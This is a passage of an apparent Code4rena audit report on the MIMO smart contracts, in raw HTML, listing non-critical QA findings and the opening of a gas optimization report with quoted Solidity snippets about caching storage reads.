href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L30\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/proxy/MIMOProxy.sol#L30</a></p>\n<h2 id=\"n04--use-a-more-recent-version-of-solidity\" style=\"position:relative;\"><a href=\"#n04--use-a-more-recent-version-of-solidity\" aria-label=\"n04  use a more recent version of solidity permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑04]  Use a more recent version of solidity</h2>\n<p>Use a solidity version of at least 0.8.13 to get the ability to use <code>using for</code> with a list of free functions</p>\n<p><em>There are 11 instances of this issue.</em></p>\n<h2 id=\"n05--constant-redefined-elsewhere\" style=\"position:relative;\"><a href=\"#n05--constant-redefined-elsewhere\" aria-label=\"n05  constant redefined elsewhere permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑05]  Constant redefined elsewhere</h2>\n<p>Consider defining in only one contract so that values cannot become out of sync when only one location is updated. A <a href=\"https://medium.com/coinmonks/gas-cost-of-solidity-library-functions-dbe0cedd4678\">cheap way</a> to store constants in a single location is to create an <code>internal constant</code> in a <code>library</code>. If the variable is a local cache of another contract’s value, consider making the cache variable internal or private, which will require external users to query the contract with the source of truth, so that callers don’t get out of sync.</p>\n<p><em>There are 7 instances of this issue.</em></p>\n<h2 id=\"n06--lines-are-too-long\" style=\"position:relative;\"><a href=\"#n06--lines-are-too-long\" aria-label=\"n06  lines are too long permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑06]  Lines are too long</h2>\n<p>Usually lines in source code are limited to <a href=\"https://softwareengineering.stackexchange.com/questions/148677/why-is-80-characters-the-standard-limit-for-code-width\">80</a> characters. Today’s screens are much larger so it’s reasonable to stretch this in some cases. Since the files will most likely reside in GitHub, and GitHub starts using a scroll bar in all cases when the length is over <a href=\"https://github.com/aizatto/character-length\">164</a> characters, the lines below should be split when they reach that length</p>\n<p><em>There is 1 instance of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"36\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">managed</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOManagedRebalance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">14</span><span class=\"mtk1\">:   @</span><span class=\"mtk12\">notice</span><span class=\"mtk1\"> </span><span class=\"mtk12\">This</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">only</span><span class=\"mtk1\"> </span><span class=\"mtk12\">serves</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\"> </span><span class=\"mtk12\">change</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">access</span><span class=\"mtk1\"> </span><span class=\"mtk12\">control</span><span class=\"mtk1\"> </span><span class=\"mtk12\">and</span><span class=\"mtk1\"> </span><span class=\"mtk12\">enforce</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk8\">`managedRebalance`</span><span class=\"mtk1\"> </span><span class=\"mtk12\">configuration</span><span class=\"mtk1\">; </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk12\">actual</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rebalance</span><span class=\"mtk1\"> </span><span class=\"mtk12\">logic</span><span class=\"mtk1\"> </span><span class=\"mtk12\">is</span><span class=\"mtk1\"> </span><span class=\"mtk12\">done</span><span class=\"mtk1\"> </span><span class=\"mtk12\">through</span><span class=\"mtk1\"> </span><span class=\"mtk12\">the</span><span class=\"mtk1\"> </span><span class=\"mtk8\">`MIMORebalance`</span><span class=\"mtk1\"> </span><span class=\"mtk12\">contract</span><span class=\"mtk1\"> </span><span class=\"mtk12\">through</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk8\">`delegateCall`</span><span class=\"mtk1\"> </span><span class=\"mtk12\">from</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> </span><span class=\"mtk8\">`MIMOProxy`</span><span class=\"mtk1\"> </span><span class=\"mtk12\">clone</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/managed/MIMOManagedRebalance.sol#L14\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/managed/MIMOManagedRebalance.sol#L14</a></p>\n<h2 id=\"n07--typos\" style=\"position:relative;\"><a href=\"#n07--typos\" aria-label=\"n07  typos permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑07]  Typos</h2>\n<p><em>There are 12 instances of this issue.</em></p>\n<h2 id=\"n08--file-is-missing-natspec\" style=\"position:relative;\"><a href=\"#n08--file-is-missing-natspec\" aria-label=\"n08  file is missing natspec permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑08]  File is missing NatSpec</h2>\n<p><em>There are 11 instances of this issue.</em></p>\n<h2 id=\"n09--natspec-is-incomplete\" style=\"position:relative;\"><a href=\"#n09--natspec-is-incomplete\" aria-label=\"n09  natspec is incomplete permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑09]  NatSpec is incomplete</h2>\n<p><em>There are 23 instances of this issue.</em></p>\n<h2 id=\"n10--event-is-missing-indexed-fields\" style=\"position:relative;\"><a href=\"#n10--event-is-missing-indexed-fields\" aria-label=\"n10  event is missing indexed fields permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑10]  Event is missing <code>indexed</code> fields</h2>\n<p>Index event fields make the field more quickly accessible to off-chain tools that parse events. However, note that each index field costs extra gas during emission, so it’s not necessarily best to index the maximum allowed per event (threefields). Each <code>event</code> should use three <code>indexed</code> fields if there are three or more fields, and gas usage is not particularly of concern for the events in question. If there are fewer than three fields, all of the fields should be indexed.</p>\n<p><em>There are 5 instances of this issue.</em></p>\n<h2 id=\"n11--not-using-the-named-return-variables-anywhere-in-the-function-is-confusing\" style=\"position:relative;\"><a href=\"#n11--not-using-the-named-return-variables-anywhere-in-the-function-is-confusing\" aria-label=\"n11  not using the named return variables anywhere in the function is confusing permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[N‑11]  Not using the named return variables anywhere in the function is confusing</h2>\n<p>Consider changing the variable to be an unnamed one</p>\n<p><em>There are 3 instances of this issue:</em></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"37\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">File: </span><span class=\"mtk12\">contracts</span><span class=\"mtk1\">/</span><span class=\"mtk12\">actions</span><span class=\"mtk1\">/</span><span class=\"mtk12\">automated</span><span class=\"mtk1\">/</span><span class=\"mtk12\">MIMOAutoRebalance</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sol</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit rebalanceAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit mintAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">/// @audit autoFee</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">142</span><span class=\"mtk1\">     </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">getAmounts</span><span class=\"mtk1\">(</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vaultId</span><span class=\"mtk1\">, </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">toCollateral</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">143       </span><span class=\"mtk11\">external</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">144       </span><span class=\"mtk11\">view</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">145       </span><span class=\"mtk11\">override</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">146       </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">147         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rebalanceAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">148         </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">149:        </span><span class=\"mtk10\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk10\">autoFee</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/automated/MIMOAutoRebalance.sol#L142-L149\">https://github.com/code-423n4/2022-08-mimo/blob/eb1a5016b69f72bc1e4fd3600a65e908bd228f13/contracts/actions/automated/MIMOAutoRebalance.sol#L142-L149</a></p>\n<p><strong><a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/118#issuecomment-1219169496\">m19 (Mimo) commented</a>:</strong></p>\n<blockquote>\n<p>This is an outstanding QA report.</p>\n</blockquote>\n<hr>\n<h1 id=\"gas-optimizations\" style=\"position:relative;\"><a href=\"#gas-optimizations\" aria-label=\"gas optimizations permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Gas Optimizations</h1>\n<p>For this contest, 40 reports were submitted by wardens detailing gas optimizations. The <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/74\">report highlighted below</a> by <strong>Dravee</strong> received the top score from the judge.</p>\n<p><em>The following wardens also submitted reports: <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/119\">IllIllI</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/60\">oyc_109</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/40\">JohnSmith</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/170\">JC</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/111\">ajtra</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/73\">NoamYakov</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/82\">TomJ</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/86\">0x1f8b</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/20\">fatherOfBlocks</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/44\">jag</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/63\">gogo</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/147\">joestakey</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/10\">ReyAdmirado</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/29\">Rolezn</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/28\">Bnke0x0</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/50\">bobirichman</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/52\">mics</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/124\">0xDjango</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/127\">rbserver</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/130\">0xSmartContract</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/5\">ignacio</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/54\">sikorico</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/57\">durianSausage</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/88\">Waze</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/91\">simon135</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/99\">ladboy233</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/115\">c3phas</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/129\">0xc0ffEE</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/131\">0xNazgul</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/138\">Funen</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/143\">Chom</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/145\">brgltd</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/151\">Deivitto</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/2\">samruna</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/7\">CodingNameKiki</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/107\">bearonbike</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/142\">Aymen0909</a>, <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/156\">Fitraldys</a>, and <a href=\"https://github.com/code-423n4/2022-08-mimo-findings/issues/174\">0x040</a>.</em></p>\n<h2 id=\"table-of-contents\" style=\"position:relative;\"><a href=\"#table-of-contents\" aria-label=\"table of contents permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Table of Contents</h2>\n<ul>\n<li>G-01. Caching storage values in memory</li>\n<li>G-02. Multiple accesses of a mapping/array should use a local variable cache</li>\n<li>G-03. Use of the <code>memory</code> keyword when <code>storage</code> should be used</li>\n<li>G-04. Unnecessary memory operations with an <code>immutable</code> variable</li>\n<li>G-05. The result of a function call should be cached rather than re-calling the function</li>\n<li>G-06. Unchecking arithmetics operations that can’t underflow/overflow</li>\n<li>G-07. <code>&#x3C;array>.length</code> should not be looked up in every loop of a <code>for-loop</code></li>\n<li>G-08. <code>++i</code> costs less gas compared to <code>i++</code> or <code>i += 1</code> (same for <code>--i</code> vs <code>i--</code> or <code>i -= 1</code>)</li>\n<li>G-09. Increments/decrements can be unchecked in for-loops</li>\n<li>G-10. It costs more gas to initialize variables with their default value than letting the default value be applied</li>\n<li>G-11. Upgrade pragma</li>\n<li>\n<p>G-12. Optimizations with assembly</p>\n<ul>\n<li>12.1. Use assembly for math (add, sub, mul, div)</li>\n<li>12.2. Use assembly to check for address(0)</li>\n<li>12.3. Use assembly to write storage values</li>\n</ul>\n</li>\n<li>G-13. Use Custom Errors instead of Revert Strings to save Gas</li>\n</ul>\n<h2 id=\"g-01-caching-storage-values-in-memory\" style=\"position:relative;\"><a href=\"#g-01-caching-storage-values-in-memory\" aria-label=\"g 01 caching storage values in memory permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>[G-01] Caching storage values in memory</h2>\n<p>The code can be optimized by minimizing the number of SLOADs.</p>\n<p>SLOADs are expensive (100 gas after the 1st one) compared to MLOADs/MSTOREs (3 gas each). Storage values read multiple times should instead be cached in memory the first time (costing 1 SLOAD) and then read from this cache to avoid multiple SLOADs.</p>\n<ul>\n<li>contracts/actions/MIMOEmptyVault.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"38\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">76</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">77</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">CALLER_NOT_LENDING_POOL</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">98</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">vaultCollateral</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">flashloanRepayAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span></code></pre>\n<ul>\n<li>contracts/actions/MIMOLeverage.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">81</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">82</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">CALLER_NOT_LENDING_POOL</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">100</span><span class=\"mtk1\">:     </span><span class=\"mtk12\">asset</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeIncreaseAllowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">), </span><span class=\"mtk12\">flashloanRepayAmount</span><span class=\"mtk1\">); </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span></code></pre>\n<ul>\n<li>contracts/actions/MIMORebalance.sol:</li>\n</ul>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">79</span><span class=\"mtk1\">:     </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\"> != </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">)) { </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">   </span><span class=\"mtk7\">80</span><span class=\"mtk1\">:       </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk12\">CustomErrors</span><span class=\"mtk1\">.</span><span class=\"mtk11\">CALLER_NOT_LENDING_POOL</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">lendingPool</span><span class=\"mtk1\">)); </span><span class=\"mtk3\">//@audit gas: SLOAD (lendingPool)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk7\">101</span><span class=\"mtk1\">:     </span><span 